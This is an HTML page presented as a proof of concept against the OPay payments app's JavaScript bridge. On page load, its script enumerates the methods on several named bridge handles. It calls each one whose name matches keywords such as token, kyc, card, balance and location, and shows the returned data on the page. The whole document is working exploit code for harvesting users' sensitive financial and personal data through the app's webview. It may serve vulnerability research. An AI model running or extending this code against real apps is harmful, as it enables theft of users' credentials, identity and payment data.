<!DOCTYPE html>
<html>
<head>
    <title>OPay Security PoC - Full Bridge Enumeration</title>
    <style>
        body { font-family: 'Courier New', monospace; padding: 15px; background: #000; color: #0f0; font-size: 12px; }
        .log-box { background: #111; border: 1px solid #333; padding: 10px; margin-top: 10px; word-break: break-all; }
        .entry { margin-bottom: 5px; border-bottom: 1px solid #222; padding-bottom: 5px; }
        .critical { color: #f00; font-weight: bold; background: #300; padding: 2px; }
        .success { color: #0f0; }
        .header { color: #ff0; font-size: 16px; margin-bottom: 10px; border-bottom: 2px solid #ff0; }
    </style>
</head>
<body>
    <div class="header">OPay JS Bridge Deep Enumeration</div>
    <div id="status">Scanning bridges...</div>
    <div class="log-box" id="log"></div>

    <script>
        function log(msg, className) {
            const div = document.createElement('div');
            div.className = 'entry ' + (className || '');
            div.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
            document.getElementById('log').appendChild(div);
            window.scrollTo(0,document.body.scrollHeight);
        }

        async function enumerateBridge(name) {
            if (!window[name]) {
                log("Bridge handle [" + name + "] not found.", "critical");
                return;
            }
            
            const bridge = window[name];
            log("--- Enumerating [" + name + "] ---", "success");
            
            // 1. Get all property names
            const methods = Object.getOwnPropertyNames(bridge).filter(p => typeof bridge[p] === 'function');
            log("Methods found: " + methods.join(", "));

            // 2. Automated Scanning for sensitive keywords
            const keywords = ["token", "info", "account", "user", "contact", "phone", "kyc", "card", "balance", "base", "gps", "location"];
            
            for (const method of methods) {
                const lowerMethod = method.toLowerCase();
                if (keywords.some(k => lowerMethod.includes(k))) {
                    try {
                        log("Probing: " + name + "." + method + "()...");
                        let result = bridge[method]();
                        if (result && (typeof result === 'object' || (typeof result === 'string' && (result.startsWith('{') || result.startsWith('['))))) {
                             log("!!! SENSITIVE DATA FROM " + method + " !!!", "critical");
                             log(">> " + (typeof result === 'string' ? result : JSON.stringify(result)), "critical");
                        } else {
                             log(">> " + method + " returned: " + result);
                        }
                    } catch (e) {
                        log("Failed call " + method + ": " + e.message);
                    }
                }
            }
        }

        window.onload = async function() {
            log("Exploit initialized. Starting deep scan.");
            const handles = ['control', 'history', 'OPay3PartyContext', 'ORideContext'];
            for (const handle of handles) { await enumerateBridge(handle); }
            log("Scan Complete.", "success");
        };
    </script>
</body>
</html>
